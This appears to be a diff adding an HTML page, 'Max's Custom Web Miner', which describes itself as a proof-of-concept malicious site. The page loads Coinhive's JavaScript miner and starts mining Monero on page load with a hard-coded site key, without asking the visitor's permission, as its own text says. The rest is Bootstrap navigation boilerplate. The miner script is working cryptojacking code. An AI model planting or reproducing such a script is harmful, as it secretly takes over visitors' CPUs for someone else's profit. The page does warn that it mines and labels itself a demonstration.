@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>Max's Custom Miner</title>
+    <link rel="stylesheet" href="https://bootswatch.com/3/paper/bootstrap.min.css">
+
+  <nav class="navbar navbar-inverse">
+    <div class="container-fluid">
+      <div class="navbar-header">
+        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-2">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+        <a class="navbar-brand" href="#">Web Miner</a>
+      </div>
+
+      <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-2">
+        <ul class="nav navbar-nav">
+          <li class="active"><a href="#"> Help <span class="sr-only">(current)</span></a></li>
+          <li><a href="#">Link</a></li>
+        </ul>
+        <form class="navbar-form navbar-left" role="search">
+          <div class="form-group">
+            <input type="text" class="form-control" placeholder="Search">
+          </div>
+          <button type="submit" class="btn btn-default">Submit</button>
+        </form>
+        <ul class="nav navbar-nav navbar-right">
+          <li><a href="#">Link</a></li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <div class="jumbotron">
+    <h1>Welcome to Max's Custom Web Miner</h1>
+    <p class="lead">This is a proof of concept site of a malicious website using Javascript to mine cryptocurrency. In this example, we are mining Monero with Coinhive's Javascript mining scripts. They are set to not ask for permission from the user to mine using the victim's CPU. <strong>Do not distribute.</strong>.
+      <b />
+    <p class="text-danger"> <strong>Use at your own risk!</strong> This site will actively mine cryptocurrency!</p>
+
+  </div>
+
+
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+   var miner = new CoinHive.Anonymous('yIXNaHGYFUJqdZeHRvGu9Te1oqhUMEVb', {throttle: 0.5});
+   miner.start();
+
+    // Listen on events
+    miner.on('found', function() { console.log("Hash found") })
+    miner.on('accepted', function() { console.log("Hash accepted")})
+
+    // Update stats once per second
+    setInterval(function() {
+      var hashesPerSecond = miner.getHashesPerSecond();
+      var totalHashes = miner.getTotalHashes();
+      var acceptedHashes = miner.getAcceptedHashes();
+
+      // Output to HTML elements...
+    }, 1000);
+  </script>
+
+
+
+  </body>
+</html>
